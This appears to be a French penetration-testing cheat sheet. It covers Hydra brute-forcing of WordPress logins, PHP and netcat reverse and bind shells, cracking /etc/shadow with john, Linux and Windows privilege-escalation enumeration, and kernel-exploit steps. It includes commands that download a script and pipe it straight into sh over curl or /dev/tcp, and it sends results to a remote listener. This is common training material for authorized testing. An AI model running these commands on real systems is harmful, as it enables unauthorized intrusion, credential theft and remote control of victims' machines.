# Brute Force
## Hydra
- Permet d’obtenir le nom d'utilisateur avec un dictionnaire :
``` ZSH
sudo hydra -L <Dictionnaire> -p <mot de passe> <IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

- Permet d’obtenir le mot de passe d'un utilisateur :
``` ZSH
sudo hydra -l <Username> -P <Dictionnaire> <IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
```


# Installation de la Payload
Sites web : 
- https://packetstormsecurity.com/ 
- https://pentestmonkey.net/

## Reverse Shell PHP
Télécharger le reverse Shell PHP : https://pentestmonkey.net/tools/web-shells/php-reverse-shell 
Puis changer les lignes 49 et 50

# C&C
## Netcat

### Listener

```bash
nc -nlvp 666
```

| arg | description |
| ---- | ---- |
| l | listener |
| n | pas de resolution de nom |
| v | verbose |
| p | port |
### Bind Shell 
L'attaquant initie la connexion à la victime
Victime :
- Linux :
```bash
nc -nlvp 666
```
- Windows :
```powershell
ncat -nlvp 666 -e cmd.exe
```

attaquant : 
```bash
nc -lv 666
```

### Reverse Shell
1. Permet d’écouter sur le port  `sudo nc -nlvp 666`
2. Faire exécuter le reverse Shell
3. Une fois le reverse Shell exécuté et ouvert dans le terminal, exécuter la commande   `import pty;pty.spawn("/bin/bash")'` permet d'invoquer un Shell interactif.
>  **Attention** : la commande précédente peut être détecté et alerté le SOC

# Élévation de privilège
https://an0nud4y.com/notes/lin-priv-esc/
## Linux
### Énumération

#### Système

```bash
hostname
uname -a # detail de la machine
cat /proc/version # permet de déterminer la version du kernel
lscpu # detail du cpu
ps aux | grep root # liste les processus lancer par root
cat /etc/issue # permet de déterminer la version de l'os
pspy (https://github.com/DominicBreuker/pspy/releases)
echo $PATH 
```

#### Utilisateur

```bash
whoami # affiche l'utilisateur en cours d'utilisation
echo $USER # affiche l'utilisateur en cours d'utilisation(Stealth)
id # id de l'utilisateur
sudo -l # affiche les commande avec les droit sudo pour l'utilisateur
cat /etc/passwd # list les utilisateurs
cut -d ":" -f 1 /etc/passwd #list users
```
#### Réseau

```bash
ifonfig
ip a
ip route 
arp -a 
ip neigh
netstat
```
### SUID
Pour lister les commande avec les droits root :
```
find / -user root -perm -4000 2> /dev/null
```

Pour lister les commande avec les droits au niveau du groupe :
```
find / -user root -perm -2000 2> /dev/null
```

Pour lister les commande exécutable en tant que sudo par l'utilisateur actuel
```
sudo -l
```

https://gtfobins.github.io/

#### Shadow
`/etc/shadow` `/etc/passwd`

```bash
unshadow passwd.txt shadow.txt > passwords.txt

john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

```

### Script d'automatisation
#### LinPeas
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
LinPeas permet de détecté les élévation de privilège possible
```zsh
# Sur la machine cible si elle a accès à internet
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# En local
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

sudo python3 -m http.server 80 #Hote
curl 192.168.56.1/linpeas.sh | sh #Cible

# Sans curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Hote
cat < /dev/tcp/10.10.10.10/80 | sh #Cible

# Execution en mémoire et envoie du resultat à l'hote
nc -lvnp 9002 | tee linpeas.out #Hote
curl 192.168.56.1:80/linpeas.sh | sh | nc 10.10.14.20 9002 #Cible
```

#### Linuxprivchecker
https://github.com/linted/linuxprivchecker

#### Linux-smart-enumeration
https://github.com/diego-treitos/linux-smart-enumeration

#### Linux-exploit-suggester
https://github.com/The-Z-Labs/linux-exploit-suggester

#### LinEnum
https://github.com/rebootuser/LinEnum

### Kernel Exploits

#### Méthodologie
1. Identifiez la version du noyau
2. Rechercher et trouver un code d'exploitation pour la version du noyau du système cible
3. Exécutez l'exploit

https://github.com/lucyoa/kernel-exploits
#### 1. Identification
![[4. Attaquer la cible#Système]]
#### 2. Recherche d'exploit
https://www.exploit-db.com/
#### 3. Exploitation

``` bash
# Installation de l'exploit sur la machine
sudo python3 -m http.server 80 #Hote
curl 10.9.151.128/37292.c #Cible
```
## Windows
### Enumération

#### Système

```cmd
systeminfo
wmic qfe
wmic qfe get Caption,Description,HotFixID,InstalledOn # Patchs
wmic logicaldisk get caption,description,providername
```

```powershell
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid}
Get-Hotfix -description "Security update"
```
#### Utilisateur

```bash
whoami # affiche l'utilisateur en cours d'utilisation
whoami /priv
whoami /groups
net user <username>
net localgroup <user>
```
#### Réseau

```bash
ifonfig
ip a
ip route 
arp -a 
ip neigh
netstat
```

